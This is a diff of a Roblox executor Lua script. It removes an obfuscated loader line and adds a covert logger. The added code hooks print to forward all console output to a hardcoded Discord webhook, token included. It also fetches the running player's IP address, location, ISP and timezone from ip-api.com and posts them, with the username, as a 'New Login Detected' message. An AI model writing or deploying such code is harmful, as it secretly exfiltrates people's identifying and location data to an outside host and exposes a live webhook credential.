@@ -1,1 +1,75 @@
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v88=v2(v0(v30,16));if v19 then local v110=0;local v111;while true do if (v110==1) then return v111;end if (v110==0) then v111=v5(v88,v19);v19=nil;v110=1;end end else return v88;end end end);local function v20(v31,v32,v33) if v33 then local v89=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-((2257 -(1523 + 114)) -(555 + 64)))) + (932 -(771 + 86 + 74)))) ;return v89-(v89%(569 -(367 + 201))) ;else local v90=((1323 -394) -(214 + 713))^(v32-(1 + 0)) ;return (((v31%(v90 + v90))>=v90) and (1 + 0)) or ((1942 -(68 + 997)) -(282 + 595)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (1272 -(226 + 1044)) );v18=v18 + (8 -6) ;return (v36 * 256) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + 3 );v18=v18 + (121 -(32 + 85)) ;return (v40 * (16441815 + 335401)) + (v39 * (14533 + 51003)) + (v38 * 256) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=958 -(892 + (1252 -(1069 + 118))) ;local v44=(v20(v42,2 -1 ,36 -16 ) * ((3 -1)^((866 -484) -(87 + 263)))) + v41 ;local v45=v20(v42,21,(461 -250) -(67 + 113) );local v46=((v20(v42,32)==(1 + 0)) and  -(2 -1)) or (1 + 0 + 0) ;if (v45==(0 -0)) then if (v44==0) then return v46 * (952 -(802 + 150)) ;else v45=2 -1 ;v43=0 -0 ;end elseif (v45==(1490 + 557)) then return ((v44==(997 -((1625 -710) + 82))) and (v46 * (((2 + 0) -1)/((791 -(368 + 423)) + 0)))) or (v46 * NaN) ;end return v8(v46,v45-(1344 -321) ) * (v43 + (v44/(2^(163 -111)))) ;end local function v25(v47) local v48;if  not v47 then local v91=18 -(10 + 8) ;while true do if (v91==(442 -(416 + 26))) then v47=v23();if (v47==(0 -0)) then return "";end break;end end end v48=v3(v16,v18,(v18 + v47) -(1 + 0) );v18=v18 + v47 ;local v49={};for v65=1 -0 , #v48 do v49[v65]=v2(v1(v3(v48,v65,v65)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return function(v92,v93,v94,v95,v96,v97,v98,v99,v100) local v101=(function() return 0;end)();local v92=(function() ret
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+-- Your Discord Webhook URL
+local WebhookURL = "https://discord.com/api/webhooks/1364349879903715368/qC-cQAh9Uf3CrWdU2ZTYo4UQ0Y3VAEnMQDj46fk-0azqVfFOtvT7ynfk1YeBIkrCG_7V"
+
+-- Function to send log to Discord
+local function sendToDiscord(message)
+    local data = {
+        ["content"] = message,
+        ["username"] = "Roblox Logger"
+    }
+    
+    local request = syn and syn.request or http_request or request or (http and http.request)
+    if request then
+        request({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    else
+        warn("Your executor does not support HTTP requests.")
+    end
+end
+
+-- Capture output and send it to Discord
+local function captureLogs()
+    -- Override print to send logs to Discord
+    local oldPrint = print
+    print = function(...)
+        local args = {...}
+        local logMessage = table.concat(args, " ")
+        sendToDiscord(logMessage)  -- Send the log message to Discord
+        oldPrint(unpack(args))  -- Also print to the F9 console
+    end
+end
+
+-- Start capturing logs
+captureLogs()
+
+-- Fetch IP info and send to Discord
+local requestFunc = syn and syn.request or http_request or request or (http and http.request)
+if not requestFunc then
+    warn("Your executor doesn't support HTTP requests.")
+    return
+end
+
+local response = requestFunc({
+    Url = "http://ip-api.com/json/", -- This gives your IP and geolocation info
+    Method = "GET"
+})
+
+if response and response.Body then
+    local data = HttpService:JSONDecode(response.Body)
+    local username = Players.LocalPlayer.Name  -- Get the username of the player executing the script
+
+    -- Prepare the message to send to Discord, including IP info and username
+    local ipInfoMessage = "== New Login Detected ==\n"
+    ipInfoMessage = ipInfoMessage .. "Username: " .. username .. "\n"
+    ipInfoMessage = ipInfoMessage .. "IP: " .. data.query .. "\n"
+    ipInfoMessage = ipInfoMessage .. "Country: " .. data.country .. "\n"
+    ipInfoMessage = ipInfoMessage .. "Region: " .. data.regionName .. "\n"
+    ipInfoMessage = ipInfoMessage .. "City: " .. data.city .. "\n"
+    ipInfoMessage = ipInfoMessage .. "ISP: " .. data.isp .. "\n"
+    ipInfoMessage = ipInfoMessage .. "Timezone: " .. data.timezone
+    sendToDiscord(ipInfoMessage)
+else
+    warn("Failed to fetch IP info.")
+end
+
+-- Example of usage
+print("antoher beam yesir.")
